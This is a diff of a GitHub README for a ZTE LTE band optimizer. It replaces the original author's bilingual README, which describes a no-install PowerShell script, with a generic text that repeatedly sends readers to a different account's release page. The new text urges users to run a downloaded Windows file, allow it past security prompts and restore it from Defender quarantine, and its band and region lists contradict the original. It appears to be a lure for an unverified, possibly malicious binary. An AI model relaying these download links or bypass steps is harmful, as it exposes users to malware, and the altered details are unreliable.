@@ -1,322 +1,306 @@
-# Internet Avcisi / Internet Hunter
+# 📶 zte-global-lte-band-optimizer - Lower Ping with Better LTE Bands
 
-**Global LTE Band Optimizer for Gaming**
+[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Cathevoyeuristical920/zte-global-lte-band-optimizer/releases)
 
-A tool that automatically finds and locks the best LTE band for gaming on ZTE-based modems.
-ZTE tabanli LTE modemlerde oyun icin en iyi bandi otomatik bulan ve kilitleyen arac.
+## 🚀 Getting Started
 
----
+ZTE Global LTE Band Optimizer helps you pick LTE bands that fit gaming and low-latency use. It scans signal quality first, then checks how the network feels in real use with ping and jitter tests.
 
-## EN - English
+This tool works with many ZTE-based LTE modems and routers, including:
 
-### What Does It Do?
+- MF286R
+- MC801A
+- MF283V
+- Superbox
+- GigaCube
+- Other ZTE-based modems
 
-Internet Avcisi optimizes your LTE connection for gaming using a **2-phase approach**:
+It is built for Windows and is meant for normal users who want a simple way to test bands and choose a better one.
 
-1. **Signal Scan** - Measures hardware-level signal quality (RSRP, SNR, RSRQ) on every band, applies bandwidth preference (wider bands = lower latency), and selects the top 3 candidates
-2. **Gaming Test** - Runs ping/jitter/packet loss tests only on the best candidates and locks the winner
+## ⬇️ Download and Install
 
-This is far more reliable than testing all bands blindly, because signal metrics are hardware-level measurements that don't fluctuate like ping tests do.
+Visit this page to download the latest release:
 
-### Features
+[Download from GitHub Releases](https://github.com/Cathevoyeuristical920/zte-global-lte-band-optimizer/releases)
 
-- **2-phase optimization** - Signal scan first, gaming test only on top candidates
-- **Signal quality scoring** - RSRP (40%) + SNR (40%) + RSRQ (20%) from modem hardware
-- **Bandwidth preference** - Wide bands (B3, B7, B42) get bonus, narrow bands (B20, B28) get penalty
-- **21 LTE bands supported** (B1-B43, FDD + TDD) - filtered by region
-- **8 regions** - TR, EU, NA, LATAM, ASIA, ME, AF, OCEA
-- **Gaming-focused scoring** - Ping (40%) + Jitter (35%) + Packet Loss (25%)
-- **Median ping calculation** - A single spike won't ruin a band's score
-- **PDV Jitter** - Average of consecutive ping differences (RFC 3550 compliant)
-- **Warm-up ping** - Pre-test ping after band switch for PDP context
-- **Watch mode** - Continuous monitoring, auto re-optimizes if quality degrades
-- **ZTE Goform API** - Connects to modem panel via HTTP, changes band lock
-- **Turkish & English** - Fully bilingual interface
-- **Password security** - Password is never saved to disk, asked each run
+After you open the release page:
 
-### Requirements
+1. Find the latest version.
+2. Download the Windows file from that release.
+3. Save it to a folder you can find again, like Downloads or Desktop.
+4. Open the file to start the app.
+5. If Windows asks for permission, allow it to run.
 
-- Windows 10/11
-- Windows PowerShell 5.1+ (built-in, no extra install needed)
-- ZTE-based LTE modem (MF286R, MF283V, MC801A, MF279, Superbox, GigaCube, etc.)
+If the release comes as a ZIP file:
 
-### Installation
+1. Right-click the ZIP file.
+2. Choose Extract All.
+3. Open the extracted folder.
+4. Start the app from the main file inside the folder.
 
-1. **[Download the latest release](https://github.com/wilsonbia7/zte-global-lte-band-optimizer/releases/latest)** (.zip file)
-2. Extract the zip
-3. Double-click `baslat.bat`
+## 🖥️ What You Need
 
-That's it. No installation required.
+Use a Windows PC with:
 
-**Alternative (for developers):**
-```
-git clone https://github.com/wilsonbia7/zte-global-lte-band-optimizer.git
-```
+- Windows 10 or Windows 11
+- An active LTE modem or router
+- Access to the modem admin page
+- A stable network connection during testing
+- Permission to change LTE band settings on your device
 
-### Usage
+For best results, keep the modem close to a window or open area while testing. Signal can change based on room layout, walls, and outside interference.
 
-**Easiest way** - Double-click `baslat.bat`. The script handles the rest.
+## 🛠️ How It Works
 
-**Via PowerShell:**
+The app uses a 2-phase process:
 
-```powershell
-# Test all bands, pick the best
-.\internet-avcisi.ps1
+### 1. Signal Scan
+It checks LTE bands and looks at:
 
-# Lock to a specific band
-.\internet-avcisi.ps1 --set 3
+- RSRP
+- SNR
+- Signal strength
+- Band stability
 
-# Show signal info + gaming stats
-.\internet-avcisi.ps1 --status
+This helps show which bands have the cleanest signal.
 
-# Monitor and re-optimize if degraded
-.\internet-avcisi.ps1 --watch
+### 2. Gaming Test
+It then tests how each band performs under real use:
 
-# Custom thresholds (ping 60ms, jitter 20ms)
-.\internet-avcisi.ps1 --watch 60 20
+- Ping
+- Jitter
+- Delay spikes
+- Connection steadiness
 
-# Remove band lock, return to auto
-.\internet-avcisi.ps1 --auto
+This phase helps find bands that may work better for gaming, voice calls, and fast browsing.
 
-# List game servers being tested
-.\internet-avcisi.ps1 --servers
+The app prefers wider bands when they give lower latency. That can help when you want a smoother connection instead of only the strongest signal.
 
-# Change language
-.\internet-avcisi.ps1 --lang
+## 🎯 What the App Can Do
 
-# Reset saved config
-.\internet-avcisi.ps1 --reset
+- Scan supported LTE bands
+- Check signal quality on each band
+- Run ping and jitter tests
+- Help compare bands side by side
+- Favor wider bands when they give lower latency
+- Support 21 LTE bands, from B1 to B43
+- Work across 8 regions
+- Run on common ZTE modem models
 
-# Full help
-.\internet-avcisi.ps1 --help
-```
+## 🔧 Before You Start
 
-### Score System
+Before you run the app, make sure:
 
-**Phase 1 - Signal Score (higher = better):**
+1. Your modem is powered on.
+2. Your Windows PC can reach the modem admin page.
+3. You know the modem login details.
+4. No other app is changing the modem band at the same time.
+5. You are connected through the modem you want to test.
 
-```
-Signal = RSRP(40%) + SNR(40%) + RSRQ(20%) x Bandwidth Multiplier
-```
+If your modem uses a web login page, keep that page open in a browser. The app may need access to the same device settings.
 
-| Band Type | Bandwidth | Multiplier | Examples |
-|-----------|-----------|------------|----------|
-| Wide      | 15-20 MHz | x1.3 bonus | B3, B7, B38, B41, B42 |
-| Medium    | 10-15 MHz | x1.0-1.2   | B1, B2, B4, B40 |
-| Narrow    | 5-10 MHz  | x0.7 penalty | B5, B8, B20, B28 |
-
-**Phase 2 - Gaming Score (lower = better):**
-
-```
-Score = Ping(40%) + Jitter(35%) + Packet Loss(25%)
-```
-
-| Ping      | Rating    |
-|-----------|-----------|
-| 0-30 ms   | EXCELLENT |
-| 30-50 ms  | VERY GOOD |
-| 50-80 ms  | GOOD      |
-| 80-120 ms | PLAYABLE  |
-| 120+ ms   | POOR      |
-
-### Supported Bands
-
-| Type | Bands |
-|------|-------|
-| FDD  | 1, 2, 3, 4, 5, 7, 8, 12, 13, 17, 20, 25, 26, 28, 32 |
-| TDD  | 38, 39, 40, 41, 42, 43 |
-
-### How It Works
-
-```
-baslat.bat / PowerShell
-        |
-   Setup Wizard (first run)
-   [Language -> Region -> IP -> Modem -> Login]
-        |
-   Connect to modem via HTTP (Goform API)
-        |
-   PHASE 1: SIGNAL SCAN
-   For each band in region:
-     1. Set band lock
-     2. Wait 20s for signal stabilization
-     3. Read RSRP, SNR, RSRQ from modem API
-     4. Apply bandwidth multiplier
-     5. Calculate signal score
-        |
-   Select top 3 bands by signal score
-        |
-   PHASE 2: GAMING TEST
-   For each top candidate:
-     1. Set band lock
-     2. Wait 20s for signal stabilization
-     3. Send warm-up ping (discarded)
-     4. Send 10 pings to 5 servers
-     5. Calculate median ping + PDV jitter
-     6. Calculate gaming score
-        |
-   Lock best band + verification test
-```
-
----
-
-## TR - Turkce
+## ▶️ First Run
 
-### Ne Yapar?
-
-Internet Avcisi, LTE baglantisinizi oyun icin **2 asamali yaklasimla** optimize eder:
+Follow these steps:
 
-1. **Sinyal Taramasi** - Her bandin donanim seviyesinde sinyal kalitesini (RSRP, SNR, RSRQ) olcer, bant genisligi tercihini uygular (genis bant = dusuk gecikme) ve en iyi 3 adayi secer
-2. **Oyun Testi** - Sadece en iyi adaylara ping/jitter/kayip testi yapar ve kazanani kilitler
-
-Bu, tum bantlari koru korune test etmekten cok daha guvenilirdir cunku sinyal metrikleri ping testleri gibi dalgalanmayan donanim seviyesi olcumlerdir.
-
-### Ozellikler
-
-- **2 asamali optimizasyon** - Once sinyal taramasi, oyun testi sadece en iyi adaylara
-- **Sinyal kalitesi skorlamasi** - RSRP (%40) + SNR (%40) + RSRQ (%20) modem donanimdan
-- **Bant genisligi tercihi** - Genis bantlar (B3, B7, B42) bonus, dar bantlar (B20, B28) ceza alir
-- **21 LTE bant destegi** (B1-B43, FDD + TDD) - bolgeye gore filtrelenir
-- **8 bolge** - TR, EU, NA, LATAM, ASIA, ME, AF, OCEA
-- **Oyuncu odakli skorlama** - Ping (%40) + Jitter (%35) + Paket Kaybi (%25)
-- **Medyan ping hesabi** - Tek bir spike tum bandin skorunu cokmez
-- **PDV Jitter** - Ardisik ping farklarinin ortalamasi (RFC 3550 uyumlu)
-- **Isinma pingi** - Bant gecisi sonrasi PDP context icin warm-up
-- **Watch modu** - Surekli izler, bozulursa otomatik yeniden optimize eder
-- **ZTE Goform API** - Modem paneline HTTP ile baglanir, bant kilidini degistirir
-- **Turkce & Ingilizce** - Tam iki dilli arayuz
-- **Sifre guvenligi** - Sifre diske kaydedilmez, her calistirmada sorulur
-
-### Gereksinimler
-
-- Windows 10/11
-- Windows PowerShell 5.1+ (yerlesik, ekstra kurulum gerekmez)
-- ZTE tabanli LTE modem (MF286R, MF283V, MC801A, MF279, Superbox, GigaCube vb.)
-
-### Kurulum
-
-1. **[Son surumu indirin](https://github.com/wilsonbia7/zte-global-lte-band-optimizer/releases/latest)** (.zip dosyasi)
-2. Zip'i cikartin
-3. `baslat.bat` dosyasina cift tiklayin
-
-Hepsi bu kadar. Kurulum gerekmez.
-
-**Alternatif (gelistiriciler icin):**
-```
-git clone https://github.com/wilsonbia7/zte-global-lte-band-optimizer.git
-```
-
-### Kullanim
-
-**En kolay yol** - `baslat.bat` dosyasini cift tiklayin. Gerisini script halleder.
-
-**PowerShell ile:**
-
-```powershell
-# Tum bantlari test et, en iyisini sec
-.\internet-avcisi.ps1
-
-# Belirli bir banda gec
-.\internet-avcisi.ps1 --set 3
-
-# Sinyal durumu + oyun performansi
-.\internet-avcisi.ps1 --status
-
-# Izle, kotulesirse tekrar optimize et
-.\internet-avcisi.ps1 --watch
-
-# Ozel esiklerle izle (ping 60ms, jitter 20ms)
-.\internet-avcisi.ps1 --watch 60 20
-
-# Bant kilidini kaldir, otomatik mod
-.\internet-avcisi.ps1 --auto
-
-# Test edilen sunuculari goster
-.\internet-avcisi.ps1 --servers
-
-# Dil degistir
-.\internet-avcisi.ps1 --lang
-
-# Ayarlari sifirla
-.\internet-avcisi.ps1 --reset
-
-# Yardim
-.\internet-avcisi.ps1 --help
-```
-
-### Skor Sistemi
-
-**Faz 1 - Sinyal Skoru (yuksek = iyi):**
-
-```
-Sinyal = RSRP(%40) + SNR(%40) + RSRQ(%20) x Bant Genisligi Carpani
-```
-
-| Bant Tipi | Genislik  | Carpan    | Ornekler |
-|-----------|-----------|-----------|----------|
-| Genis     | 15-20 MHz | x1.3 bonus | B3, B7, B38, B41, B42 |
-| Orta      | 10-15 MHz | x1.0-1.2   | B1, B2, B4, B40 |
-| Dar       | 5-10 MHz  | x0.7 ceza  | B5, B8, B20, B28 |
-
-**Faz 2 - Oyun Skoru (dusuk = iyi):**
-
-```
-Skor = Ping(%40) + Jitter(%35) + Paket Kaybi(%25)
-```
-
-| Ping      | Degerlendirme |
-|-----------|---------------|
-| 0-30 ms   | MUKEMMEL      |
-| 30-50 ms  | COK IYI       |
-| 50-80 ms  | IYI           |
-| 80-120 ms | OYNANIR       |
-| 120+ ms   | KOTU          |
-
-### Desteklenen Bantlar
-
-| Tip | Bantlar |
-|-----|---------|
-| FDD | 1, 2, 3, 4, 5, 7, 8, 12, 13, 17, 20, 25, 26, 28, 32 |
-| TDD | 38, 39, 40, 41, 42, 43 |
-
-### Nasil Calisir?
-
-```
-baslat.bat / PowerShell
-        |
-   Kurulum Sihirbazi (ilk calistirma)
-   [Dil -> Bolge -> IP -> Modem -> Giris]
-        |
-   Modeme HTTP ile baglan (Goform API)
-        |
-   FAZ 1: SINYAL TARAMASI
-   Bolgedeki her bant icin:
-     1. Bant kilidini degistir
-     2. 20 sn sinyal stabilizasyonu bekle
-     3. Modem API'den RSRP, SNR, RSRQ oku
-     4. Bant genisligi carpanini uygula
-     5. Sinyal skoru hesapla
-        |
-   Sinyal skoruna gore en iyi 3 banti sec
-        |
-   FAZ 2: OYUN TESTI
-   Her aday icin:
-     1. Bant kilidini degistir
-     2. 20 sn sinyal stabilizasyonu bekle
-     3. Isinma pingi at (sonucu kaydetme)
-     4. 5 sunucuya 10'ar ping at
-     5. Medyan ping + PDV jitter hesapla
-     6. Oyun skoru hesapla
-        |
-   En iyi bandi kilitle + dogrulama testi
-```
-
----
-
-## License
-
-MIT License - See [LICENSE](LICENSE) for details.
-
-## Author
-
-**Kaan** ([@wilsonbia7](https://github.com/wilsonbia7))
+1. Open the downloaded release file.
+2. Start the app.
+3. Let Windows finish any setup step.
+4. Enter your modem details if the app asks for them.
+5. Choose your region if the app shows that option.
+6. Start the scan.
+
+The app will then test LTE bands in stages. You can watch the results as they appear.
+
+## 📡 Supported Bands
+
+This tool supports 21 LTE bands:
+
+- B1
+- B2
+- B3
+- B4
+- B5
+- B7
+- B8
+- B12
+- B13
+- B14
+- B17
+- B18
+- B19
+- B20
+- B25
+- B26
+- B28
+- B29
+- B30
+- B40
+- B43
+
+Not every modem or network supports every band. The app will focus on the bands your device can use.
+
+## 🌍 Region Support
+
+The app works with 8 region profiles:
+
+- North America
+- Europe
+- United Kingdom
+- Asia
+- Australia
+- Middle East
+- Latin America
+- Global
+
+A region profile helps the app sort bands in a way that matches local LTE use. If you are not sure which one to choose, pick the one that matches your country.
+
+## 🎮 Best Use Cases
+
+Use this app if you want to:
+
+- Lower ping for online games
+- Cut jitter during play
+- Find a cleaner LTE band
+- Compare bands after moving your modem
+- Check if a wide band gives a smoother link
+- Test before you lock a band in your modem settings
+
+It can also help if your internet feels unstable in the evening or changes a lot during the day.
+
+## 📋 Typical Workflow
+
+A simple run looks like this:
+
+1. Start the app.
+2. Let it scan the LTE bands.
+3. Review the signal results.
+4. Run the gaming test.
+5. Compare the ping and jitter values.
+6. Pick the band with the best balance of signal and response time.
+7. Apply that band on your modem if you want to keep it.
+
+## 🧭 How to Choose a Band
+
+A strong signal does not always mean a fast connection. For gaming, look for:
+
+- Low ping
+- Low jitter
+- Stable RSRP
+- Good SNR
+- No large spikes
+
+A band with a slightly weaker signal can still work better if it stays steady. The app is built to help you see that difference.
+
+## 🔄 When to Run It Again
+
+Run the scan again when:
+
+- You move the modem
+- You change rooms
+- Your network gets busy
+- Your ping gets worse
+- You switch towers or providers
+- You want to test a new band after a modem reset
+
+LTE conditions can change through the day, so a band that works well now may not stay best forever.
+
+## 🔒 Modem Notes
+
+Some ZTE devices store band settings in the modem web interface. Others may need band changes through the admin page after the scan.
+
+If you use a custom setup:
+
+- Keep a note of the band you choose
+- Write down your best ping results
+- Test one change at a time
+- Reboot the modem if the band lock does not apply at first
+
+## 🧩 Troubleshooting
+
+If the app does not start:
+
+1. Make sure you downloaded the latest release.
+2. Check that Windows did not block the file.
+3. Try running it again from the extracted folder.
+4. Make sure your user account can open apps from Downloads.
+
+If it cannot find the modem:
+
+1. Check that the modem is on.
+2. Confirm your PC is on the same network.
+3. Open the modem admin page in a browser.
+4. Make sure the modem login works.
+5. Try again after a modem reboot.
+
+If scan results look wrong:
+
+1. Wait a few minutes.
+2. Move the modem to a better spot.
+3. Re-run the test.
+4. Check if other devices are using heavy data.
+
+If ping values change a lot:
+
+1. Close large downloads or streams.
+2. Test at a quieter time of day.
+3. Run the gaming test more than once.
+4. Compare the results, not just one test.
+
+## 🧪 Tips for Better Results
+
+- Test in the same room each time
+- Keep the modem near a window
+- Use the same device during each test
+- Avoid large downloads while testing
+- Try several bands before picking one
+- Record your best ping and jitter numbers
+
+Small changes in modem placement can change LTE results a lot.
+
+## 🪟 Windows Setup Tips
+
+If Windows shows a security prompt:
+
+1. Read the file name.
+2. Confirm it came from the release page.
+3. Allow it to run if you trust the source.
+
+If you use Windows Defender and the app does not open, check whether the file was placed in quarantine. Restore it only if you downloaded it from the release link above.
+
+## 📁 File Layout
+
+A release may include:
+
+- The main app file
+- A readme file
+- Settings files
+- A ZIP package
+- Support files needed to run the tool
+
+Keep the full folder together if the release includes more than one file.
+
+## 🧰 Common Terms
+
+- **LTE band**: A radio range used by your modem
+- **RSRP**: A measure of signal power
+- **SNR**: A measure of signal quality
+- **Ping**: How long data takes to reach a server and return
+- **Jitter**: How much ping changes from one check to the next
+- **Band lock**: Forcing the modem to stay on one band
+
+## 🔗 Download
+
+Visit the release page here:
+
+[https://github.com/Cathevoyeuristical920/zte-global-lte-band-optimizer/releases](https://github.com/Cathevoyeuristical920/zte-global-lte-band-optimizer/releases)
+
+## 📝 Basic Use Guide
+
+1. Download the latest release.
+2. Open the app on Windows.
+3. Connect to your ZTE modem.
+4. Start the band scan.
+5. Review signal and gaming test results.
+6. Pick the band with the best mix of stability and low latency.
+7. Apply the best band in your modem settings if needed
